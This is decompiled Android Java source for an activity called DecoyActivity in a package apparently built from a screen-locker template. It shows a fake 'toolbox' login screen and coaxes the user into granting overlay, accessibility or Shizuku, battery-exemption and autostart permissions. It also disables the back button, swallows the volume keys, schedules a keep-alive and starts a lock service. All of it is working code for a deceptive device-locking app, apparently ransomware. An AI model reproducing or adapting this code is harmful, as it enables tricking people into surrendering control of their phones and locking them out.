package com.lockgen.template.app.ui;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import com.lockgen.template.app.core.Assets;
import com.lockgen.template.app.core.Cfg;
import com.lockgen.template.app.core.KeepAlive;
import com.lockgen.template.app.core.LockService;
import com.lockgen.template.app.sku.SkuEngine;
import com.lockgen.template.app.sku.SkuGuardService;
import org.json.JSONArray;
import org.json.JSONObject;

public class DecoyActivity extends Activity {
    private static final int REQ_ACCESSIBILITY = 1002;
    private static final int REQ_OVERLAY = 1001;
    private JSONObject cfg;
    private JSONObject id;
    private EditText input;
    private SharedPreferences sp;
    private JSONObject theme;
    private final Handler ui = new Handler(Looper.getMainLooper());
    private Runnable waitTask;
    private int waitTicks;

    @Override // android.app.Activity
    public void onBackPressed() {
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.sp = getSharedPreferences("sp", 0);
        JSONObject jSONObject = Cfg.get(this);
        this.cfg = jSONObject;
        this.id = Cfg.obj(jSONObject, "id");
        this.theme = Cfg.obj(this.cfg, "theme");
        showNoticeOnce();
        if (Cfg.b(Cfg.obj(this.cfg, "guard"), "boot", true)) {
            KeepAlive.schedule(this, Cfg.i(Cfg.obj(this.cfg, "guard"), "alarmSec", 300));
        }
        if (isAccessibilityOn()) {
            LockService.startIfEnabled(this);
            setContentView(buildSplash());
            startWaiting();
            return;
        }
        setContentView(buildUi());
    }

    private View buildUi() {
        int i;
        char c;
        int color = color(Cfg.str(this.theme, "accent", "#3AE0FF"), -12918529);
        int color2 = color(Cfg.str(this.theme, "text", "#FFFFFF"), -1);
        final int color3 = color(Cfg.str(this.theme, "btnBg", "#FF3B30"), -50384);
        int color4 = color(Cfg.str(this.theme, "bg", "#0B0F15"), -16052459);
        FrameLayout frameLayout = new FrameLayout(this);
        frameLayout.setBackgroundColor(color4);
        Bitmap image = Assets.image(this, "decoy_bg.png");
        if (image != null) {
            ImageView imageView = new ImageView(this);
            imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);
            imageView.setImageBitmap(image);
            imageView.setAlpha(0.45f);
            frameLayout.addView(imageView, new FrameLayout.LayoutParams(-1, -1));
        }
        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.setOrientation(1);
        linearLayout.setGravity(1);
        linearLayout.setPadding(dp(34), dp(52), dp(34), dp(28));
        frameLayout.addView(linearLayout, new FrameLayout.LayoutParams(-1, -1));
        TextView textView = new TextView(this);
        textView.setText(Cfg.str(this.id, "title", "工具箱"));
        textView.setTextColor(color2);
        textView.setTextSize(2, 34.0f);
        textView.setTypeface(Typeface.create(Typeface.SERIF, 1));
        textView.setLetterSpacing(0.16f);
        textView.setGravity(17);
        linearLayout.addView(textView);
        TextView textView2 = new TextView(this);
        textView2.setText(Cfg.str(this.id, "sub", ""));
        textView2.setTextColor(1157627903);
        textView2.setTextSize(2, 10.0f);
        textView2.setLetterSpacing(0.42f);
        textView2.setGravity(17);
        char c2 = 65534;
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-2, -2);
        layoutParams.topMargin = dp(8);
        linearLayout.addView(textView2, layoutParams);
        JSONArray arr = Cfg.arr(this.id, "menus");
        if (arr.length() > 0) {
            LinearLayout linearLayout2 = new LinearLayout(this);
            linearLayout2.setOrientation(1);
            GradientDrawable gradientDrawable = new GradientDrawable();
            gradientDrawable.setColor(352321535);
            int i2 = 16;
            gradientDrawable.setCornerRadius(dp(16));
            gradientDrawable.setStroke(dp(1), 587202559);
            linearLayout2.setBackground(gradientDrawable);
            linearLayout2.setPadding(dp(14), dp(10), dp(14), dp(10));
            LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-1, -2);
            layoutParams2.topMargin = dp(24);
            linearLayout.addView(linearLayout2, layoutParams2);
            final String str = Cfg.str(this.id, "menuTip", "请先完成权限配置");
            int i3 = 0;
            while (i3 < arr.length()) {
                String optString = arr.optString(i3, "");
                if (optString.isEmpty()) {
                    i = i3;
                    c = c2;
                } else {
                    LinearLayout linearLayout3 = new LinearLayout(this);
                    linearLayout3.setOrientation(0);
                    linearLayout3.setGravity(i2);
                    i = i3;
                    linearLayout3.setPadding(dp(4), dp(9), dp(4), dp(9));
                    linearLayout3.setOnClickListener(new View.OnClickListener() { // from class: com.lockgen.template.app.ui.DecoyActivity$$ExternalSyntheticLambda1
                        @Override // android.view.View.OnClickListener
                        public final void onClick(View view) {
                            DecoyActivity.this.lambda$buildUi$0(str, view);
                        }
                    });
                    TextView textView3 = new TextView(this);
                    textView3.setText(optString);
                    textView3.setTextColor(-855638017);
                    textView3.setTextSize(2, 13.0f);
                    c = 65534;
                    linearLayout3.addView(textView3, new LinearLayout.LayoutParams(0, -2, 1.0f));
                    TextView textView4 = new TextView(this);
                    textView4.setText("已就绪");
                    textView4.setTextColor(color);
                    textView4.setTextSize(2, 11.0f);
                    linearLayout3.addView(textView4);
                    linearLayout2.addView(linearLayout3);
                }
                i3 = i + 1;
                c2 = c;
                i2 = 16;
            }
        }
        EditText editText = new EditText(this);
        this.input = editText;
        editText.setHint(Cfg.str(this.id, "hint", "请输入卡密"));
        this.input.setHintTextColor(721420287);
        this.input.setTextColor(color);
        this.input.setTextSize(2, 13.0f);
        this.input.setGravity(17);
        this.input.setSingleLine(true);
        this.input.setInputType(1);
        GradientDrawable gradientDrawable2 = new GradientDrawable();
        gradientDrawable2.setColor(452984831);
        gradientDrawable2.setCornerRadius(dp(10));
        gradientDrawable2.setStroke(dp(1), 872415231);
        this.input.setBackground(gradientDrawable2);
        LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(dp(230), dp(44));
        layoutParams3.topMargin = dp(22);
        linearLayout.addView(this.input, layoutParams3);
        Button button = new Button(this);
        button.setText(Cfg.str(this.id, "btn", "登  录"));
        button.setTextColor(-16052459);
        button.setTextSize(2, 14.0f);
        button.setTypeface(Typeface.DEFAULT_BOLD);
        button.setAllCaps(false);
        GradientDrawable gradientDrawable3 = new GradientDrawable();
        gradientDrawable3.setColor(color);
        gradientDrawable3.setCornerRadius(dp(10));
        button.setBackground(gradientDrawable3);
        button.setOnClickListener(new View.OnClickListener() { // from class: com.lockgen.template.app.ui.DecoyActivity$$ExternalSyntheticLambda2
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                DecoyActivity.this.lambda$buildUi$1(color3, view);
            }
        });
        LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(dp(230), dp(44));
        layoutParams4.topMargin = dp(14);
        linearLayout.addView(button, layoutParams4);
        JSONObject obj = Cfg.obj(this.cfg, "extra");
        if (Cfg.b(obj, "battery", true)) {
            TextView link = link("省电优化");
            link.setOnClickListener(new View.OnClickListener() { // from class: com.lockgen.template.app.ui.DecoyActivity$$ExternalSyntheticLambda3
                @Override // android.view.View.OnClickListener
                public final void onClick(View view) {
                    DecoyActivity.this.lambda$buildUi$2(view);
                }
            });
            linearLayout.addView(link, bottomLp(24));
        }
        if (Cfg.b(obj, "autostart", true)) {
            TextView link2 = link("自启动管理");
            link2.setOnClickListener(new View.OnClickListener() { // from class: com.lockgen.template.app.ui.DecoyActivity$$ExternalSyntheticLambda4
                @Override // android.view.View.OnClickListener
                public final void onClick(View view) {
                    DecoyActivity.this.lambda$buildUi$3(view);
                }
            });
            linearLayout.addView(link2, bottomLp(6));
        }
        TextView textView5 = new TextView(this);
        textView5.setText(Cfg.str(this.id, "powered", ""));
        textView5.setTextColor(318767103);
        textView5.setTextSize(2, 9.0f);
        linearLayout.addView(textView5, bottomLp(0));
        TextView textView6 = new TextView(this);
        textView6.setText(Cfg.str(this.id, "version", ""));
        textView6.setTextColor(285212671);
        textView6.setTextSize(2, 8.0f);
        linearLayout.addView(textView6, bottomLp(4));
        return frameLayout;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$buildUi$0(String str, View view) {
        Toast.makeText(this, str, 0).show();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$buildUi$1(int i, View view) {
        onLogin(i);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$buildUi$2(View view) {
        requestBattery();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$buildUi$3(View view) {
        openVendorAutostart();
    }

    private TextView link(String str) {
        TextView textView = new TextView(this);
        textView.setText(str);
        textView.setTextColor(-1711276033);
        textView.setTextSize(2, 10.0f);
        textView.setGravity(17);
        textView.setPadding(dp(12), dp(6), dp(12), dp(6));
        return textView;
    }

    private LinearLayout.LayoutParams bottomLp(int i) {
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-2, -2);
        layoutParams.topMargin = dp(i);
        return layoutParams;
    }

    private View buildSplash() {
        FrameLayout frameLayout = new FrameLayout(this);
        frameLayout.setBackgroundColor(color(Cfg.str(this.theme, "bg", "#0B0F15"), -16052459));
        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.setOrientation(1);
        linearLayout.setGravity(17);
        TextView textView = new TextView(this);
        textView.setText(Cfg.str(this.id, "splash", "正在初始化…"));
        textView.setTextColor(-1996488705);
        textView.setTextSize(2, 14.0f);
        linearLayout.addView(textView);
        frameLayout.addView(linearLayout, new FrameLayout.LayoutParams(-1, -1));
        return frameLayout;
    }

    private void onLogin(int i) {
        EditText editText = this.input;
        String trim = editText == null ? "" : editText.getText().toString().trim();
        String str = Cfg.str(this.id, "cardKey", "");
        if (trim.isEmpty()) {
            Toast.makeText(this, Cfg.str(this.id, "needKey", "请输入卡密"), 0).show();
        } else if (!str.isEmpty() && !str.equals(trim)) {
            Toast.makeText(this, Cfg.str(this.id, "badKey", "卡密无效"), 0).show();
        } else if (!Settings.canDrawOverlays(this)) {
            Toast.makeText(this, Cfg.str(this.id, "needOverlay", "请先开启悬浮窗权限"), 0).show();
            startActivityForResult(new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse("package:" + getPackageName())), REQ_OVERLAY);
        } else if (isSkuMode()) {
            startSkuFlow();
        } else {
            openAccessibility();
        }
    }

    private boolean isSkuMode() {
        return "sku".equals(Cfg.str(this.cfg, "lockType", "ab"));
    }

    private void startSkuFlow() {
        final JSONObject obj = Cfg.obj(this.cfg, "sku");
        if (!SkuEngine.available(this)) {
            Toast.makeText(this, Cfg.str(obj, "noSku", "本机未激活 Shizuku，请先激活后重试"), 1).show();
            if (Cfg.b(obj, "fallback", false)) {
                openAccessibility();
            }
        } else if (SkuEngine.authorized()) {
            SkuEngine.ensureChannel(this);
            runSkuInit(obj);
        } else if (!Cfg.b(obj, "autoRequest", true)) {
            Toast.makeText(this, "已关闭自动申请，请在 Shizuku 应用里手动授权本应用", 1).show();
        } else {
            Toast.makeText(this, Cfg.str(obj, "needSku", "需要 Shizuku 权限，点一下「允许」即可"), 1).show();
            SkuEngine.requestPermission(this, new SkuEngine.PermCallback() { // from class: com.lockgen.template.app.ui.DecoyActivity$$ExternalSyntheticLambda0
                @Override // com.lockgen.template.app.sku.SkuEngine.PermCallback
                public final void onResult(boolean z) {
                    DecoyActivity.this.lambda$startSkuFlow$4(obj, z);
                }
            });
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$startSkuFlow$4(JSONObject jSONObject, boolean z) {
        if (!z) {
            Toast.makeText(this, "未获得 Shizuku 授权；若授权框没有弹出，请到 Shizuku 应用里手动允许", 1).show();
            if (Cfg.b(jSONObject, "fallback", false)) {
                openAccessibility();
                return;
            }
            return;
        }
        runSkuInit(jSONObject);
    }

    private void runSkuInit(final JSONObject jSONObject) {
        new Thread(new Runnable() { // from class: com.lockgen.template.app.ui.DecoyActivity$$ExternalSyntheticLambda5
            @Override // java.lang.Runnable
            public final void run() {
                DecoyActivity.this.lambda$runSkuInit$6(jSONObject);
            }
        }, "sku-init").start();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$runSkuInit$6(final JSONObject jSONObject) {
        long currentTimeMillis = System.currentTimeMillis() + 8000;
        while (!SkuEngine.channelReady() && System.currentTimeMillis() < currentTimeMillis) {
            try {
                Thread.sleep(120L);
            } catch (InterruptedException unused) {
                Thread.currentThread().interrupt();
                return;
            }
        }
        final boolean channelReady = SkuEngine.channelReady();
        if (channelReady) {
            SkuEngine.applyInitial(this, jSONObject);
        }
        runOnUiThread(new Runnable() { // from class: com.lockgen.template.app.ui.DecoyActivity$$ExternalSyntheticLambda6
            @Override // java.lang.Runnable
            public final void run() {
                DecoyActivity.this.lambda$runSkuInit$5(channelReady, jSONObject);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$runSkuInit$5(boolean z, JSONObject jSONObject) {
        if (!z) {
            Toast.makeText(this, "SKU 通道未就绪，改用常规方式", 1).show();
            if (Cfg.b(jSONObject, "fallback", true)) {
                openAccessibility();
                return;
            }
            return;
        }
        SkuGuardService.start(this);
        if (Cfg.b(jSONObject, "autoLock", true)) {
            LockService.startIfEnabled(this);
        }
        startWaiting();
    }

    private void openAccessibility() {
        Toast.makeText(this, Cfg.str(this.id, "needAcc", "请开启无障碍服务"), 1).show();
        try {
            startActivityForResult(new Intent("android.settings.ACCESSIBILITY_SETTINGS"), REQ_ACCESSIBILITY);
        } catch (Throwable unused) {
            Toast.makeText(this, "请手动前往无障碍设置", 1).show();
        }
    }

    private void requestBattery() {
        try {
            startActivity(new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", Uri.parse("package:" + getPackageName())));
        } catch (Throwable unused) {
            Toast.makeText(this, "请手动在电池设置中允许后台运行", 0).show();
        }
    }

    private void openVendorAutostart() {
        String[][] strArr = {new String[]{"com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"}, new String[]{"com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"}, new String[]{"com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"}, new String[]{"com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity"}, new String[]{"com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"}, new String[]{"com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity"}};
        for (int i = 0; i < 6; i++) {
            String[] strArr2 = strArr[i];
            try {
                Intent intent = new Intent();
                intent.setClassName(strArr2[0], strArr2[1]);
                startActivity(intent);
                return;
            } catch (Throwable unused) {
            }
        }
        Toast.makeText(this, "请手动在系统设置中允许自启动", 0).show();
    }

    private void showNoticeOnce() {
        String str = Cfg.str(this.id, "notice", "");
        if (str.isEmpty() || this.sp.getBoolean("notice_shown", false)) {
            return;
        }
        this.sp.edit().putBoolean("notice_shown", true).apply();
        try {
            new AlertDialog.Builder(this).setTitle(Cfg.str(this.id, "noticeTitle", "提示")).setMessage(str).setCancelable(false).setPositiveButton(Cfg.str(this.id, "noticeBtn", "知道了"), (DialogInterface.OnClickListener) null).show();
        } catch (Throwable unused) {
        }
    }

    private void startWaiting() {
        if (this.waitTask != null) {
            return;
        }
        this.waitTicks = Cfg.i(Cfg.obj(this.cfg, "ui"), "waitTicks", 24);
        Runnable runnable = new Runnable() { // from class: com.lockgen.template.app.ui.DecoyActivity.1
            @Override // java.lang.Runnable
            public void run() {
                if (!DecoyActivity.this.sp.getBoolean("lock_active", false)) {
                    DecoyActivity decoyActivity = DecoyActivity.this;
                    int i = decoyActivity.waitTicks - 1;
                    decoyActivity.waitTicks = i;
                    if (i > 0) {
                        DecoyActivity.this.ui.postDelayed(this, 500L);
                        return;
                    }
                }
                DecoyActivity.this.finish();
            }
        };
        this.waitTask = runnable;
        this.ui.postDelayed(runnable, 500L);
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == REQ_ACCESSIBILITY && isAccessibilityOn()) {
            LockService.startIfEnabled(this);
            finish();
        } else if (i == REQ_OVERLAY && Settings.canDrawOverlays(this)) {
            if (isSkuMode()) {
                startSkuFlow();
            } else {
                openAccessibility();
            }
        }
    }

    @Override // android.app.Activity
    protected void onResume() {
        super.onResume();
        if (!isAccessibilityOn() || this.sp.getBoolean("lock_active", false)) {
            return;
        }
        LockService.startIfEnabled(this);
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        Runnable runnable = this.waitTask;
        if (runnable != null) {
            this.ui.removeCallbacks(runnable);
        }
        super.onDestroy();
    }

    private boolean isAccessibilityOn() {
        String string;
        if (Settings.Secure.getInt(getContentResolver(), "accessibility_enabled") == 1 && (string = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services")) != null) {
            String str = getPackageName() + "/" + getPackageName() + ".core.LockService";
            TextUtils.SimpleStringSplitter simpleStringSplitter = new TextUtils.SimpleStringSplitter(':');
            simpleStringSplitter.setString(string);
            while (simpleStringSplitter.hasNext()) {
                if (simpleStringSplitter.next().equalsIgnoreCase(str)) {
                    return true;
                }
            }
            return false;
        }
        return false;
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (Cfg.b(Cfg.obj(this.cfg, "guard"), "blockKeys", true) && (i == 24 || i == 25)) {
            return true;
        }
        return super.onKeyDown(i, keyEvent);
    }

    private int dp(int i) {
        return (int) ((i * getResources().getDisplayMetrics().density) + 0.5f);
    }

    private static int color(String str, int i) {
        try {
            return Color.parseColor(str);
        } catch (Throwable unused) {
            return i;
        }
    }
}